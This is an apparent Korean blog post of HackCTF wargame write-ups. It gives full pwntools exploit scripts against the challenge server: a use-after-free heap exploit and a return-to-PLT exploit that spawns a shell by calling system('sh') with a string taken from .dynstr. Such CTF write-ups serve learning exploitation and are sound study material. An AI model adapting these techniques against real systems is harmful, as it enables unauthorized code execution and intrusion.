---
layout: post
title:  "HackCTF Pwnable - sixth line"
excerpt: "for All Clear HackCTF"
date:   2020-07-10
categories: [wargame]
comments: true
---

<h3> 0x0 . UAF
</h3>

binary :

| canary  | fortify  | nx      | pie      | relro   |
| ------- | -------- | ------- | -------- | ------- |
| enabled | disabled | enabled | disabled | partial |



add_note함수에서 heap 청크를 두번 할당하고 free한 후에 다시 largebin 이상의 크기를 할당하고 두번째로 할당한 청크에 magic함수를 이용하여 해결했다.

exploit :

```python
from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3020)
e = ELF("./uaf")
magic = e.symbols['magic']

def add(size,content):
    p.sendlineafter(":","1")
    p.sendlineafter(":",str(size))
    p.sendlineafter(":",content)
def rm(inti):
    p.sendlineafter(":","2")
    p.sendlineafter("Index :",str(inti))
def prt(num):
    p.sendlineafter(":","3")
    p.sendlineafter("Index :",str(num))

pay = 'A' * 16
pay += p32(magic)

dum = "A"*4

add(8,dum)
add(8,dum)
rm(1)
rm(0)
add(600,pay)

prt(1)

p.interactive()
```

이 문제는  uaf를 공부하기에 아주 적절한 것 같다. 요세 힙을 공부하기 시작했는데 따로 정리해둘까 한다.



<h3> 0x1 . ROP
</h3>

이건  ROP글에서 정리했으니 패스

링크 : [http://강준혁.kr/articles/2020-03/ROP](http://강준혁.kr/articles/2020-03/ROP ) 



<h3> 0x2 . You are silver
</h3>

binary :

| canary   | fortify  | nx      | pie      | relro   |
| -------- | -------- | ------- | -------- | ------- |
| disabled | disabled | enabled | disabled | partial |



exploit :

조금 더 고민해보자..



<h3> 0x3 . Unexploitable #1
</h3>

binary :

| canary   | fortify  | nx      | pie      | relro   |
| -------- | -------- | ------- | -------- | ------- |
| disabled | disabled | enabled | disabled | partial |



exploit : 

```python
from pwn import *

p = remote("ctf.j0n9hyun.xyz",3023)
e = ELF("./Unexploitable_1")
libc = ("/lib/x86_64-linux-gnu/libc.so.6")

system_plt = e.plt['system']
fgets_got = e.got['fgets']
pr = 0x4007d3
sh = 0x4003BB + 0x4

pay = 'A'*24
pay += p64(pr)
pay += p64(sh)
pay += p64(system_plt)

p.recvuntil("Easy RTL ha? You even have system@plt!")
p.sendline(pay)

p.interactive()
```

이번에는 처음으로 dynstr을 이용한 익스를 해보았다. 원래는 릭을 해서 그냥 ROP를 하려했는데 이전에 내가 정리한 글에 http://강준혁.kr/articles/2020-03/.dynstr-exploit 이 글이 생각나서 이렇게 fflush에 sh만 잘라서 system("sh")을 넘겨줬다. 



